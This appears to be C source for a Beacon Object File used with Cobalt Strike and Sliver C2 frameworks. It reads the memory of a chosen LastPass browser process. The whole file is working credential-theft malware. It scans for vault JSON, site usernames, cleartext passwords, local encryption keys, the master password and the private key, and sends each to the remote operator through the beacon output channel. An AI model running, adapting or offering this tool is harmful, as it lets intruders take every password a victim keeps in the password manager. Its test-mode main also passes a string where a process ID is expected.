#include <windows.h>
#include <stddef.h>
#include "beacon.h"
#include "bofdefs.h"
#include "base.c"
#include "safety_checks.h"

typedef unsigned int uint32_t;

enum
{
    LASTPASS_ID_SIZE = 10,
    LASTPASS_RECORD_HEADER_SIZE = 0x18,
    LASTPASS_EXIT_RECORD_SIZE = 0x22
};

DWORD GetProcessList( int pid );
void GetProcessMemory( HANDLE hProcess, unsigned int pid );
void Write_Memory_Range( HANDLE hProcess, LPCVOID address, size_t address_sz, unsigned int pid);
int findJSON( char* buffer, int buffer_sz, char* needle, int needle_sz, char* endStr, uint32_t label, uint32_t pid );
int findString( char* buffer, int buffer_sz, char* needle, int needle_sz, char* endStr, uint32_t label, uint32_t pid );
char* findEndString( char *buffer, int buffer_sz, char* endString );
void findPrivateKey( char* buffer, int buffer_sz, uint32_t pid );

enum LASTPASS_LABEL
{
    LASTPASS_JSON = 0,
    LASTPASS_PWD_MEM_OBJECT,
    LASTPASS_AID,
    LASTPASS_NAME,
    LASTPASS_USERNAME,
    LASTPASS_PASSWORD,
    LASTPASS_G_LOCAL_KEY,
    LASTPASS_LOCAL_KEY,
    LASTPASS_MASTER_PASSWORD,
    LASTPASS_USER_CONFIG,
    LASTPASS_PRIV_KEY,
    LASTPASS_EXIT = 100
};

typedef struct _RETURN_CHUNK
{
    char ID[LASTPASS_ID_SIZE];
    int pid;
    int label;
    int ret_size;
    char ret[];
} RETURN_CHUNK, *PRETURN_CHUNK;

typedef char lastpass_header_offset_must_be_0x18[
    offsetof(RETURN_CHUNK, ret) == LASTPASS_RECORD_HEADER_SIZE ? 1 : -1];
typedef char lastpass_exit_record_must_be_0x22[
    sizeof(RETURN_CHUNK) + LASTPASS_ID_SIZE == LASTPASS_EXIT_RECORD_SIZE ? 1 : -1];

typedef struct _MEMORY_INFO 
{
    LPVOID offset;
    SIZE_T size;
    DWORD state;
    DWORD protect;
    DWORD type;
} MEMORY_INFO, *PMEMORY_INFO;

DWORD GetProcessList( int pid )
{
  HANDLE hProcess;

  // Retrieve the priority class.
  hProcess = KERNEL32$OpenProcess( PROCESS_VM_READ|PROCESS_QUERY_INFORMATION, FALSE, pid );
  if( hProcess == NULL )
  { 
    internal_printf( "OpenProcess %d Failed\n", pid);
    return (ERROR_INVALID_STATE);
  }

  GetProcessMemory(hProcess, pid);
  KERNEL32$CloseHandle( hProcess );
    
  return( ERROR_SUCCESS );
}

void GetProcessMemory( HANDLE hProcess, unsigned int pid )
{
    LPVOID lpAddress = 0;
    MEMORY_BASIC_INFORMATION lpBuffer = {0};
    size_t VQ_sz = 0;

    if( hProcess == 0 )
    {
        internal_printf("ERROR: No Process Handle\n");
        goto END;
    }   

    do
    {
        PMEMORY_INFO mem_info = (PMEMORY_INFO)intAlloc(sizeof(MEMORY_INFO));
        if (mem_info == NULL)
        {
            internal_printf("ERROR: Memory allocation failed\n");
            goto END;
        }
        MSVCRT$memset(mem_info, 0, sizeof(MEMORY_INFO));
        VQ_sz = KERNEL32$VirtualQueryEx(hProcess, lpAddress, &lpBuffer, sizeof(lpBuffer));
        if( VQ_sz == sizeof(lpBuffer) )
        {
            if(lpBuffer.State == MEM_COMMIT || lpBuffer.State == MEM_RESERVE) 
            {
                mem_info->offset = lpAddress;
                mem_info->size = lpBuffer.RegionSize;
                mem_info->state = lpBuffer.State;
                mem_info->type = lpBuffer.Type;
                mem_info->protect = lpBuffer.Protect;
            }else if( lpBuffer.State == MEM_FREE)
            {
                mem_info->offset = lpAddress;
                mem_info->size = lpBuffer.RegionSize;
                mem_info->state = lpBuffer.State;
                mem_info->type = lpBuffer.Type;
                mem_info->protect = lpBuffer.Protect;
            }    
        }else
        {
			intFree(mem_info);
            goto END;
        }   
        if (mem_info->size == 0 || (SIZE_T)lpAddress > ((SIZE_T)-1) - mem_info->size)
        {
            intFree(mem_info);
            goto END;
        }
        lpAddress = (LPVOID)((SIZE_T)lpAddress + mem_info->size);
        if( mem_info->protect == PAGE_READWRITE && mem_info->type == MEM_PRIVATE)
            Write_Memory_Range( hProcess, mem_info->offset, mem_info->size, pid);
        intFree(mem_info);
    } while(1);
END:
    return;
}

void Write_Memory_Range( HANDLE hProcess, LPCVOID address, size_t address_sz, unsigned int pid)
{
    BOOL rc = FALSE;
    SIZE_T bytesRead = 0;
    char *buffer = {0};
    int index = 0;
    int ret_sz = 1;
    int scan_sz = 0;

    if (address_sz == 0 || address_sz > 0x7fffffffU - 0x100U)
    {
        internal_printf("Skipping unsupported process-memory region size\n");
        goto END;
    }
    buffer = intAlloc(address_sz + 0x100);
    if (buffer == NULL)
    {
        internal_printf("ERROR: Memory allocation failed\n");
        goto END;
    }

    rc = KERNEL32$ReadProcessMemory( hProcess, address, buffer, address_sz, &bytesRead );
    if (rc == 0)
    {
        internal_printf( "\nReadProcessMemory failed\n");
		goto END;
    }
    if (bytesRead > 0x7fffffffU)
        goto END;
    scan_sz = (int)bytesRead;
    
    while( scan_sz >= 16 && index < scan_sz - 16 )
    {
		// Find the JSON string that contains all username and password information about each entry
        ret_sz = findJSON( buffer+index, scan_sz-index, "{\"aid\":\"", 7, "\"}}", LASTPASS_JSON, pid );
        if ( ret_sz > 0 ) goto NEXT;
        ret_sz = findString( buffer+index, scan_sz-index, "\"aid\":\"", 7, "\",\"", LASTPASS_AID, pid );
        if ( ret_sz > 0 ) goto NEXT;
        ret_sz = findString( buffer+index, scan_sz-index, "\"name\":\"", 8, "\",\"", LASTPASS_NAME, pid );
        if ( ret_sz > 0 ) goto NEXT;
        ret_sz = findString( buffer+index, scan_sz-index, "\"username\":\"", 12, "\",\"", LASTPASS_USERNAME, pid );
        if ( ret_sz > 0 ) goto NEXT;
        ret_sz = findString( buffer+index, scan_sz-index, "\"password\":\"", 12, "\",\"", LASTPASS_PASSWORD, pid );
        if ( ret_sz > 0 ) goto NEXT;
        ret_sz = findString( buffer+index, scan_sz-index, "\"g_local_key\":\"", 15, "\",\"", LASTPASS_G_LOCAL_KEY, pid );
        if ( ret_sz > 0 ) goto NEXT;
        ret_sz = findString( buffer+index, scan_sz-index, "\"local_key\":\"", 13, "\",\"", LASTPASS_LOCAL_KEY, pid );
        if ( ret_sz > 0 ) goto NEXT;
        ret_sz = findString( buffer+index, scan_sz-index, " type=\"password\"", 16, "\">", LASTPASS_MASTER_PASSWORD, pid );
        if ( ret_sz > 0 ) goto NEXT;
        ret_sz = findString( buffer+index, scan_sz-index, "<response>", 10, "</response>", LASTPASS_USER_CONFIG, pid );
        if ( ret_sz > 0 ) goto NEXT;

		// Find all cleartext passwords and users
        ret_sz = findString( buffer+index, scan_sz-index, "g_aSitesA", 9, "g_numsites", LASTPASS_PWD_MEM_OBJECT, pid );
        if ( ret_sz > 0 ) goto NEXT;

        ret_sz = 1;
        findPrivateKey( buffer+index, scan_sz-index, pid);
NEXT:
        index += ret_sz;
    }
END:
    if (buffer != NULL)
        intFree(buffer);
}

int findJSON( char* buffer, int buffer_sz, char* needle, int needle_sz, char* endStr, uint32_t label, uint32_t pid )
{
    char *end = {0};
    int ret = 0;
    RETURN_CHUNK* chunkptr = NULL;
    const char *payload = NULL;
    unsigned int chunkSz = 0;
    unsigned int payload_sz = 0;

    (void)needle;
    (void)needle_sz;

    if(buffer != NULL && buffer_sz >= 2 && MSVCRT$memcmp( buffer, "{\"", 2) == 0)
    {
        end = findEndString( buffer, buffer_sz, "\":{\"aid\"");
        if (end != NULL && (end-buffer) < 25 ) 
        {
            end = findEndString( buffer, buffer_sz, endStr ); if (end != NULL) 
            {
				end += 3;
                ret = end-buffer -1;
                if (!LastPassPayloadBounds(buffer, buffer_sz, end, 11, &payload, &payload_sz) ||
                    !LastPassRecordSize(LASTPASS_RECORD_HEADER_SIZE, payload_sz, &chunkSz))
                    return ret;

                chunkptr = intAlloc( chunkSz );
                if (chunkptr == NULL)
                {
                    internal_printf("ERROR: Memory allocation failed\n");
                    return ret;
                }
                MSVCRT$memcpy(chunkptr->ID, "LASTPASS>>", LASTPASS_ID_SIZE);
                chunkptr->pid = WS2_32$htonl(pid);
                chunkptr->label = WS2_32$htonl(label);
                chunkptr->ret_size = WS2_32$htonl(payload_sz);
                if (payload_sz > 0)
                    MSVCRT$memcpy(chunkptr->ret, payload, payload_sz);
                BeaconOutput(CALLBACK_OUTPUT, (void*)chunkptr, chunkSz);

                intFree( chunkptr );
            }            
        }
    }
    return ret;
}
int findString( char* buffer, int buffer_sz, char* needle, int needle_sz, char* endStr, uint32_t label, uint32_t pid )
{
    char *end = {0};
    int ret = 0;
    RETURN_CHUNK* chunkptr = NULL;
    const char *payload = NULL;
    unsigned int chunkSz = 0;
    unsigned int payload_sz = 0;

    if(buffer != NULL && needle != NULL && needle_sz > 0 && buffer_sz >= needle_sz &&
       MSVCRT$memcmp( buffer, needle, needle_sz) == 0)
    {
        end = findEndString( buffer, buffer_sz, endStr );
        if (end != NULL) 
        {
            ret = end-buffer -1;
            if (!LastPassPayloadBounds(buffer, buffer_sz, end, 11, &payload, &payload_sz) ||
                !LastPassRecordSize(LASTPASS_RECORD_HEADER_SIZE, payload_sz, &chunkSz))
                return ret;

            chunkptr = intAlloc( chunkSz );
            if (chunkptr == NULL)
            {
                internal_printf("ERROR: Memory allocation failed\n");
                return ret;
            }
            MSVCRT$memcpy(chunkptr->ID, "LASTPASS>>", LASTPASS_ID_SIZE);
            chunkptr->pid = WS2_32$htonl(pid);
            chunkptr->label = WS2_32$htonl(label);
            chunkptr->ret_size = WS2_32$htonl(payload_sz);
            if (payload_sz > 0)
                MSVCRT$memcpy(chunkptr->ret, payload, payload_sz);
            BeaconOutput(CALLBACK_OUTPUT, (void*)chunkptr, chunkSz);
            intFree( chunkptr );
        }
    } 
    return ret;
}

char* findEndString( char *buffer, int buffer_sz, char* endString )
{
    int limit = 0;
    int index = 1;
    int endString_sz = 0;

    if (buffer == NULL || endString == NULL || buffer_sz <= 0)
        return NULL;
    endString_sz = MSVCRT$strlen(endString);
    if (endString_sz <= 0 || endString_sz > buffer_sz)
        return NULL;
    limit = buffer_sz - endString_sz + 1;
    if (limit > 0x100000)
        limit = 0x100000;
    while( index < limit )
    {
        if ( MSVCRT$memcmp(&buffer[index], endString, endString_sz) == 0)
        {
            return &buffer[index];
        }
        index++;
    }
    return NULL;
}

void findPrivateKey( char* buffer, int available_sz, uint32_t pid )
{
    char *end = {0};
	RETURN_CHUNK* chunkptr= {0};
    const char *payload = NULL;
    unsigned int payload_sz = 0;
    unsigned int chunkSz = 0;

    if(buffer != NULL && available_sz >= 11 && MSVCRT$memcmp( buffer, "PrivateKey<",11 ) == 0)
    {
        end = findEndString(buffer, available_sz, ">LastPassPrivateKey");
        if (end == NULL || end <= (buffer+11))
            return;
        if (!LastPassPayloadBounds(buffer, available_sz, end, 11, &payload, &payload_sz) ||
            !LastPassRecordSize(LASTPASS_RECORD_HEADER_SIZE, payload_sz, &chunkSz))
            return;

        chunkptr = intAlloc( chunkSz );
        if (chunkptr == NULL)
        {
            internal_printf("ERROR: Memory allocation failed\n");
            return;
        }
        MSVCRT$memcpy(chunkptr->ID, "LASTPASS>>", LASTPASS_ID_SIZE);
        chunkptr->pid = WS2_32$htonl(pid);
        chunkptr->label = WS2_32$htonl(LASTPASS_PRIV_KEY);
        chunkptr->ret_size = WS2_32$htonl(payload_sz);
        MSVCRT$memcpy(chunkptr->ret, payload, payload_sz);
        BeaconOutput(CALLBACK_OUTPUT, (void*)chunkptr, chunkSz);

        intFree( chunkptr );
    } 
}

#ifdef BOF
VOID go( 
	IN PCHAR Buffer, 
	IN ULONG Length 
) 
{
	DWORD dwErrorCode = ERROR_SUCCESS;
	// $args = bof_pack($1, "zi", $string_arg, $int_arg);
	datap parser = {0};
	int* pid_list = NULL;
	int *tmp = NULL;
	int pid_sz = 0;
	unsigned int blob_sz = 0;
	unsigned int required_sz = 0;
	RETURN_CHUNK* chunkptr= {0};
    unsigned int chunkSz = 0;

	if(!bofstart())
	{
		return;
	}
	if (Buffer == NULL || Length < 12 || Length > 0x7fffffffU ||
		LastPassReadLe32(Buffer) != Length - 4)
	{
		BeaconPrintf(CALLBACK_ERROR, "Invalid LastPass argument envelope.");
		goto go_end;
	}
	parser.original = Buffer;
	parser.buffer = Buffer + 4;
	parser.length = (int)Length - 4;
	parser.size = parser.length;
	pid_sz = BeaconDataInt(&parser);
	if (pid_sz <= 0 || pid_sz > 65536 || parser.length < 4)
	{
		BeaconPrintf(CALLBACK_ERROR, "Invalid LastPass PID count.");
		goto go_end;
	}
	required_sz = (unsigned int)pid_sz * sizeof(int);
	blob_sz = LastPassReadLe32(parser.buffer);
	if (blob_sz < required_sz || blob_sz > (unsigned int)(parser.length - 4) ||
		(blob_sz % sizeof(int)) != 0)
	{
		BeaconPrintf(CALLBACK_ERROR, "Invalid LastPass PID array.");
		goto go_end;
	}

	pid_list = (int*)intAlloc(pid_sz*sizeof(int));
	if (pid_list == NULL)
	{
		BeaconPrintf(CALLBACK_ERROR, "LastPass PID allocation failed.");
		goto go_end;
	}

    DWORD datalen = 0;
	tmp = (int*)BeaconDataExtract(&parser, (int*)&datalen);
	if (tmp == NULL || datalen != blob_sz || parser.length != 0)
	{
		BeaconPrintf(CALLBACK_ERROR, "Invalid or trailing LastPass PID data.");
		goto go_end;
	}
	for( int index = 0; index < pid_sz; index++)
	{
		pid_list[index] = WS2_32$htonl(tmp[index]);
		if (pid_list[index] <= 0)
		{
			BeaconPrintf(CALLBACK_ERROR, "Invalid LastPass process ID.");
			continue;
		}
		dwErrorCode = GetProcessList( pid_list[index] );
		if(ERROR_SUCCESS != dwErrorCode)
		{
			BeaconPrintf(CALLBACK_ERROR, "lastpass failed: %lX\n", dwErrorCode);
		}
	}

go_end:
	if( pid_list != NULL)
		intFree(pid_list);

    chunkSz = LASTPASS_EXIT_RECORD_SIZE;
    chunkptr = intAlloc( chunkSz );
    if (chunkptr != NULL)
    {
        MSVCRT$memcpy(chunkptr->ID, "LASTPASS>>", LASTPASS_ID_SIZE);
        chunkptr->pid = 0;
        chunkptr->label = WS2_32$htonl(LASTPASS_EXIT);
        chunkptr->ret_size = 0;
        BeaconOutput(CALLBACK_OUTPUT, (void*)chunkptr, chunkSz);
        intFree( chunkptr );
    }

	printoutput(TRUE);
	
	bofstop();
};

// Sliver extension manifests can represent a single integer PID directly, but
// cannot represent the Cobalt Strike `go` entrypoint's integer-array blob.
// Preserve `go`'s CNA ABI and expose a fixed, manifest-safe ABI here.
VOID sliver(
	IN PCHAR Buffer,
	IN ULONG Length
)
{
	DWORD dwErrorCode = ERROR_SUCCESS;
	int pid = 0;
	RETURN_CHUNK* chunkptr = {0};
	unsigned int chunkSz = 0;

	if (!LastPassParseSliverPid(Buffer, Length, &pid))
	{
		BeaconPrintf(CALLBACK_ERROR, "lastpass requires exactly one positive integer process ID");
		return;
	}

	if (!bofstart())
	{
		return;
	}

	dwErrorCode = GetProcessList(pid);
	if (ERROR_SUCCESS != dwErrorCode)
	{
		BeaconPrintf(CALLBACK_ERROR, "lastpass failed: %lX\n", dwErrorCode);
	}

	/* Preserve the CNA callback record length for future Sliver post-processing. */
	chunkSz = LASTPASS_EXIT_RECORD_SIZE;
	chunkptr = intAlloc(chunkSz);
	if (chunkptr != NULL)
	{
		MSVCRT$memcpy(chunkptr->ID, "LASTPASS>>", sizeof(chunkptr->ID));
		chunkptr->pid = 0;
		chunkptr->label = WS2_32$htonl(LASTPASS_EXIT);
		chunkptr->ret_size = 0;
		BeaconOutput(CALLBACK_OUTPUT, (void*)chunkptr, chunkSz);
		intFree(chunkptr);
	}

	printoutput(TRUE);
	bofstop();
};
#else
#define TEST_STRING_ARG "TEST_STRING_ARG"
#define TEST_INT_ARG 12345
int main(int argc, char ** argv)
{
	DWORD dwErrorCode = ERROR_SUCCESS;

	if( argc != 2)
	{
		internal_printf("USAGE: lastpass <pid>\n");
		exit(1);
	}

	internal_printf("Calling LastPass with arguments %s\n", argv[1] );

	dwErrorCode = GetProcessList( argv[1] );
	if(ERROR_SUCCESS != dwErrorCode)
	{
		BeaconPrintf(CALLBACK_ERROR, "lastpass failed: %lX\n", dwErrorCode);
	}

	internal_printf("SUCCESS.\n");

main_end:

	return dwErrorCode;
}
#endif
